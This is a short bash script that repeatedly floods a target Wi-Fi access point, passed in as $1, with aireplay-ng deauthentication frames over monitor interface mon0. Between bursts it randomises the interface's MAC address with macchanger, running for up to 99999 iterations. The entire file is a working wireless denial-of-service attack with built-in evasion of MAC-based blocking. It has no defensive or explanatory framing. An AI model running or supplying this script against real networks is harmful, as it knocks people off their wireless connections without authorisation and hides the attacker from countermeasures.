#!/bin/bash
for i in {1..99999}
do
aireplay-ng --deauth 1000 -a $1 mon0 --ignore-negative-one
ifconfig mon0 down
macchanger -r mon0
ifconfig mon0 up
sleep 5s

done
